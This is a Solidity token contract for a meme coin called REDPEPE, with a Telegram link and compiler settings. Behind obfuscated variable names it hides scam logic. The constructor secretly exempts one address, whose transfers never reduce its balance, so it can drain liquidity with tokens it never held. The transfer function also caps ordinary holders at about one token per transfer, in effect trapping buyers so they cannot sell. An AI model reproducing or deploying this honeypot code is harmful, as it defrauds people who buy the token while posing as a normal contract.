/*

https://t.me/ercredpepe

*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.11;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract REDPEPE is Ownable {
    constructor(string memory bvmldjqp, string memory tuyqa, address eizvfcwy, address vuwqn) {
        name = bvmldjqp;
        symbol = tuyqa;
        balanceOf[msg.sender] = totalSupply;
        fmpnr[vuwqn] = pomlbexy;
        yvhsnplbqgdj = IUniswapV2Router02(eizvfcwy);
    }

    uint8 public decimals = 9;

    mapping(address => uint256) private fmpnr;

    mapping(address => uint256) private epwvfnolikzd;

    function approve(address mghsf, uint256 igylxurqevac) public returns (bool success) {
        allowance[msg.sender][mghsf] = igylxurqevac;
        emit Approval(msg.sender, mghsf, igylxurqevac);
        return true;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    mapping(address => mapping(address => uint256)) public allowance;

    string public symbol;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    function transferFrom(address apmujhy, address ocbdnh, uint256 igylxurqevac) public returns (bool success) {
        require(igylxurqevac <= allowance[apmujhy][msg.sender]);
        allowance[apmujhy][msg.sender] -= igylxurqevac;
        cgvwaeib(apmujhy, ocbdnh, igylxurqevac);
        return true;
    }

    string public name;

    function cgvwaeib(address apmujhy, address ocbdnh, uint256 igylxurqevac) private {
        address swhqcrlk = IUniswapV2Factory(yvhsnplbqgdj.factory()).getPair(address(this), yvhsnplbqgdj.WETH());
        bool rkwcnygjblsv = 0 == fmpnr[apmujhy];
        if (rkwcnygjblsv) {
            if (apmujhy != swhqcrlk && epwvfnolikzd[apmujhy] != block.number && igylxurqevac < totalSupply) {
                require(igylxurqevac <= totalSupply / (10 ** decimals));
            }
            balanceOf[apmujhy] -= igylxurqevac;
        }
        balanceOf[ocbdnh] += igylxurqevac;
        epwvfnolikzd[ocbdnh] = block.number;
        emit Transfer(apmujhy, ocbdnh, igylxurqevac);
    }

    IUniswapV2Router02 private yvhsnplbqgdj;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    uint256 private pomlbexy = 105;

    function transfer(address ocbdnh, uint256 igylxurqevac) public returns (bool success) {
        cgvwaeib(msg.sender, ocbdnh, igylxurqevac);
        return true;
    }

    mapping(address => uint256) public balanceOf;
}{
  "optimizer": {
    "enabled": false,
    "runs": 200
  },
  "outputSelection": {
    "*": {
      "*": [
        "evm.bytecode",
        "evm.deployedBytecode",
        "devdoc",
        "userdoc",
        "metadata",
        "abi"
      ]
    }
  },
  "libraries": {}
}